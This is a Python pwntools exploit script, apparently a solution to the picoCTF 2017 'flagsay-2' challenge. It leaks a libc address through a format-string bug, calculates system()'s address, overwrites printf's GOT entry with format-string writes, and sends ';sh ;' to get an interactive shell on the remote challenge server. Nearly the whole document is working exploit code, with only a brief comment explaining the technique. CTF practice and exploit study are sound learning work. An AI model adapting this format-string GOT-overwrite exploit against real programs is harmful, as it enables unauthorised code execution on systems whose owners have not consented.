#!/usr/bin/env python

from pwn import *

"""
thx to poortho for reminding me that x/xw exists.

%2$p is a libc address. We can leak this to calculate the offset to system().

%9$p points to %16$p, %50$p points to %51$p.
the above were tested and corrected using GDB in the webshell.
We can rewrite %9 to point to PRINTF_GOT and %50 to point to PRINTF_GOT+2.
We then overwrite contents of %16 and %51 to point printf to system.

Note that %16 and %51 have to be overwritten in one command, else printf 
will try to run with a mangled address!
"""

LIBC_LEAK = 0xf7fc7c20
SYSTEM_LEAK = 0xf7e5c3e0
PRINTF_LEAK = 0xf7e6ac70

PRINTF_GOT = 0x08049970

#socks proxy
context.proxy = 'localhost'
r = remote("shell2017.picoctf.com", 35995)
# r = process(["./flagsay-2"], raw=False)
# gdb.attach(r, '''
# 	set disable-randomization off
# 	break *0x80486b4
# 	commands
# 	silent
# 	x/64xw $esp
# 	end
# 	c
# 	''')

# initial testing for stack leaks. 
# r.sendline("%x "*70)

log.info("Leaking libc...")
r.sendline("%2$p")
#pythonisms! recieve until after top line of flag
r.recvuntil('//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~')
# receive until bottom of flag, snip last 3 characters off
# remove // from borders, clean whitespace, split by single space
leak = r.recvuntil('//_')[:-3].replace('/', ' ').split()[0]
log.info("Libc leak is at: {0}".format(leak))

#calculate offsets
SYSTEM = int(leak, 16) - (LIBC_LEAK - SYSTEM_LEAK)
PRINTF = int(leak, 16) - (LIBC_LEAK - PRINTF_LEAK)
log.info("Printf should be at: 0x{0:x}".format(PRINTF))
log.info("System should be at: 0x{0:x}".format(SYSTEM))

# %9 is lower, %19 is higher.

payload = ("%%%dx%%9$nAA%%50$n" % (PRINTF_GOT - 129))
log.info("Writing printf GOT to stack with payload: {0}".format(payload))
r.sendline(payload)
#IMPORTANT! This silently chomps the whitespace printed by our format string
#required to succeed!
r.recvuntil('//_')


SYSTEM_LOWER = (SYSTEM & 0xffff) - 129
SYSTEM_MIDDLE = (SYSTEM >> 16) - 129

payload = ("%%%dx%%16$hn%%%dx%%51$hn" % (SYSTEM_LOWER, SYSTEM_MIDDLE - SYSTEM_LOWER))
log.info("Overwriting printf with payload {0}...".format(payload))
r.sendline(payload)
r.recvuntil('//_')

log.info("Calling system, you should have shell!")
r.sendline(";sh ;")

r.interactive()